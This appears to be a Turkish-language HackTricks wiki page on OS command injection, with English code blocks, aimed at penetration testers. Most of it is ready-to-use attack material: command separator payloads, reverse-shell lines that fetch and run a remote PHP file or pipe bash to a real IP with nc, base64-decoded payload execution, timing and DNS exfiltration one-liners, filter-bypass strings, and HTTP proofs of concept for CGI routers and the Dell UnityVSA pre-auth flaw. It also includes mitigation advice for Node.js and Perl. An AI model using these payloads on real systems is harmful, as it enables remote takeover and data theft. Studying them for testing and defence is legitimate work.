# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection nedir?

Bir **command injection**, bir uygulamayı barındıran sunucuda saldırganın rastgele işletim sistemi komutları çalıştırmasına izin verir. Sonuç olarak, uygulama ve tüm verileri tamamen ele geçirilebilir. Bu komutların çalıştırılması genellikle saldırganın uygulamanın ortamına ve altındaki sistem üzerinde yetkisiz erişim veya kontrol elde etmesini sağlar.

### Bağlam

Girdinizin **nereye enjekte edildiğine** bağlı olarak, komutlardan önce **alıntılanmış bağlamı sonlandırmanız** (using `"` or `'`) gerekebilir.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Sınırlama** Bypasses

Eğer bir linux makinesinde **herhangi komutları çalıştırmak** istiyorsanız, bu **Bypasses:** hakkında okumak ilginizi çekecektir:


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Örnekler**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parametreler

Aşağıda code injection ve benzeri RCE zafiyetlerine açık olabilecek en iyi 25 parametre yer almaktadır (kaynak: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Zamana dayalı data exfiltration

Extracting data: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Araç temel olarak şu kaynaktaki araca dayanır: `https://github.com/HoLyVieR/dnsbin` ve ayrıca dnsbin.zhack.ca adresinde barındırılmaktadır.
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS tabanlı data exfiltration'ı kontrol etmek için çevrimiçi araçlar:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` ve `execFile`

JavaScript/TypeScript back-end'leri denetlerken genellikle Node.js `child_process` API'si ile karşılaşırsınız.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` bir **shell** (`/bin/sh -c`) başlatır; bu yüzden shell için özel anlamı olan herhangi bir karakter (back-ticks, `;`, `&&`, `|`, `$()`, …) kullanıcı girdisi string içinde birleştirildiğinde **command injection** ile sonuçlanır.

**Önlem:** `execFile()` (veya `spawn()` `shell` seçeneği olmadan) kullanın ve **her argümanı ayrı bir dizi elemanı olarak** sağlayın, böylece hiçbir shell dahil olmaz:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Gerçek dünya vakası: *Synology Photos* ≤ 1.7.0-0794, kimlik doğrulaması gerektirmeyen bir WebSocket olayı aracılığıyla saldırgan kontrollü veriyi `id_user` içine yerleştirebiliyordu; bu veri daha sonra bir `exec()` çağrısına gömülerek RCE elde edilmesine neden oldu (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Tüm injection'lar shell metacharacters gerektirmez. Eğer uygulama güvensiz stringleri bir sistem aracına argüman olarak geçiriyorsa (hatta `execve`/`execFile` ile ve shell olmadan), birçok program `-` veya `--` ile başlayan herhangi bir argümanı seçenek olarak ayrıştırır. Bu, saldırganın modları değiştirmesine, çıktı yollarını değiştirmesine veya tehlikeli davranışları tetiklemesine izin verir; üstelik hiç shell'e girmesine gerek kalmaz.

Tipik olarak bunun ortaya çıktığı yerler:

- Gömülü web UI'ları/CGI işleyicileri; `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` gibi komutlar oluşturduklarında.
- Merkezi CGI yönlendiriciler (örn., `/cgi-bin/<something>.cgi` ve `topicurl=<handler>` gibi bir seçici parametre) — birden fazla işleyici aynı zayıf doğrulayıcıyı tekrar kullanıyorsa.

Denenecekler:

- Hedef araç tarafından flag olarak tüketilmesi için `-`/`--` ile başlayan değerler sağlayın.
- Davranışı değiştiren veya dosya yazan flagleri kötüye kullanın, örneğin:
  - `ping`: `-f`/`-c 100000` ile cihazı zorlamak (DoS)
  - `curl`: `-o /tmp/x` ile rastgele yollar/dosyalar yazma, `-K <url>` ile saldırgan kontrollü konfigürasyon yükleme
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` ile post-rotate sırasında yürütme elde etme (güvensiz wrapper'larda)
- Program `--` end-of-options'u destekliyorsa, yanlış yere `--` ekleyerek yapılan naif mitigasyonları atlatmayı deneyin.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (reachability and exploitation)

Gerçek dünya deseni: Perl kodu bir shell komut dizisi oluşturur ve bunu backticks (veya qx//) ile çalıştırır. Bir mod_perl AccessHandler içinde, $r->uri() gibi saldırgan kontrollü istek bileşenleri bu dizeye akabilir. Eğer herhangi bir dal ham girdiyi birleştirip sonra bir shell ile değerlendiriyorsa, pre-auth RCE elde edersiniz.

Riskli Perl execution primitives (tek bir string verildiğinde bir shell başlatır):
- Backticks / qx//: my $out = `cmd ...`;
- system tek bir string ile: system("/bin/sh -c '...'") dolaylı olarak
- open bir pipe ile: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 tek bir string ile

Minimal vulnerable shape observed in the wild:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
mod_perl'de önemli erişilebilirlik hususları:
- Handler kaydı: httpd.conf, istekleri Perl modülünüze yönlendirmelidir, örn. PerlModule MOD_SEC_EMC::AccessHandler ve belirli bir path kapsamı için AccessHandler::handler'ı çağıran yapılandırma.
- Zayıf dalı tetikleme: kimlik doğrulanmamış login akışını zorlayın, böylece type == "login" olur (örn., beklenen auth cookie'yi göndermeyin).
- Çözümlenebilir path: isteğinizin yapılandırılmış kapsam içinde çözümlenen bir URI'yi hedeflediğinden emin olun. Eğer Apache isteği handler üzerinden hiçbir zaman yönlendirmezse, sink'e ulaşılamaz.

İstismar iş akışı
1) httpd.conf'i PerlModule/MOD_PERL handler kapsamları için inceleyin ve handler tarafından işlenen çözümlenebilir bir path bulun.
2) Kimlik doğrulanmamış bir istek gönderin, böylece login yönlendirme yolu alınır (type == "login").
3) İstek-URI yoluna shell metacharacters yerleştirin, böylece $r->uri() payload'unuzu command string içine taşır.

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Tips
- Ayracı deneyin: ;, &&, |, `backticks`, $(...), ve kodlanmış yeni satırlar (%0A) alıntılamaya bağlı olarak işe yarayabilir.
- Eğer önceki yamalar bir dalda diğer argümanları alıntılarken URI'yi alıntılamıyorsa, dizenin sonuna eklenen payload'lar genellikle işe yarar: ;id# veya &&/usr/bin/id#

Hardening (Perl)
- Shell dizgileri oluşturmayın. Argüman-vektör yürütmesini tercih edin: system('/usr/bin/curl', '--silent', '--', $safe_url) — no shell.
- Eğer shell kaçınılmazsa, tüm dallarda sıkı ve tutarlı şekilde escape edin; $r->uri()'yi hostil kabul edin. Yollar/sorgular için URI::Escape ve güçlü allowlists kullanmayı düşünün.
- Komut yürütme için backticks/qx// kullanmaktan kaçının; gerçekten gerekiyorsa shell çağırmadan çıktı yakalamak için open3/list formunu kullanın.
- mod_perl handler'larında auth/redirect kod yollarını komut yürütmeden arındırın veya regresyonları (her yerde düzeltildi ama bir dalda kalma) önlemek için dallar arası aynı sanitizasyonu sağlayın.

Vulnerability hunting
- Shell komutları oluşturan patch-diff modüllerini inceleyin; dallar arasındaki tutarsız alıntılama için arayın (ör. if ($type eq 'login') kaçışsız bırakılmış).
- Backticks, qx//, open\s*\(|\||, ve system\s*\(\s*" için grep yapın ve string-tabanlı shell'leri bulun. Sink'ten request entry ($r) noktasına kadar bir call graph oluşturun ve pre-auth erişilebilirliğini doğrulayın.

Real-world case: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- type == "login" olduğunda AccessTool.pm:getCASURL içinde backticks ile yapılan ve ham $uri ($r->uri()) ile birleştirilen pre-auth command injection.
- MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login') üzerinden ulaşılabiliyor.
- Pratik nüans: handler tarafından kapsanan çözümlenebilir bir yol kullanın; aksi halde modül çalışmayacak ve sink tetiklenmeyecektir.

## Referanslar

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
